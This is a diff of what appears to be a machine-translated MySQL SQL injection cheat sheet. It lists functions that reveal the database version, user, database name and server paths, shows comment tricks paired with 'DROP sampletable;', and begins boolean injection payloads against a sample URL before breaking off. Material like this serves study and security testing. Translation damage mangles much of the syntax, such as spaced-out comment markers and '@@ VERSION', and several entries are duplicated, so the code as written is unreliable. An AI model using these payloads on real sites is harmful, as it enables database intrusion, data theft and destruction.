@@ -1,60 +1,112 @@
 0x01 basic
+
 Check the current database version
+
 VERSION ()
+
 @@ VERSION
+
 @@ GLOBAL.VERSION
+
 Currently logged in user
+
 USER ()
+
 CURRENT_USER ()
+
 SYSTEM_USER ()
+
 SESSION_USER ()
+
 Currently used database
+
 DATABASE ()
+
 SCHEMA ()
+
 Path related
+
 @@ BASEDIR: mysql installation path:
+
 @@ SLAVE_LOAD_TMPDIR: Temporary folder path:
+
 @@ DATADIR: Data Storage Path:
+
 @@ CHARACTER_SETS_DIR: character set file path
+
 @@ LOG_ERROR: error log file path:
+
 @@ PID_FILE: pid-file file path
+
 @@ BASEDIR: mysql installation path:
+
 @@ SLAVE_LOAD_TMPDIR: Temporary folder path:
+
 Joint data
+
 CONCAT ()
+
 GROUP_CONCAT ()
+
 CONCAT_WS ()
+
 Alphanumeric related
+
 ASCII (): Get the ascii code value of the letter
+
 BIN (): The binary string representation of the return value
+
 CONV (): hex conversion
 FLOOR ()
+
 ROUND ()
+
 LOWER (): turn into lowercase letters
+
 UPPER (): converted to capital letters
+
 HEX (): hexadecimal encoding
+
 UNHEX (): hexadecimal decoding
+
 String interception
+
 MID ()
+
 LEFT ()
+
 SUBSTR ()
+
 SUBSTRING ()
+
 Comments
+
 Interline comments
+
 - - (- there is a space behind)
+- 
 DROP sampletable; -
+
 #
 DROP sampletable; #
+
 `(Backtick)
+
 Inline comments
 / * * / + DROP / * content * / sampletable;
 / *! Statement * /
 / *! select * from test * /
+
 Statement will be executed
+
 0x02 injection technology
+
 Determine whether there is injection
+
 Assumptions are: www.test.com/chybeta.php?id=1
+
 Numeric injection
+
 chybeta.php?id=1+1
 chybeta.php?id=-1 or 1=1
 chybeta.php?id=-1 or 10-2=8
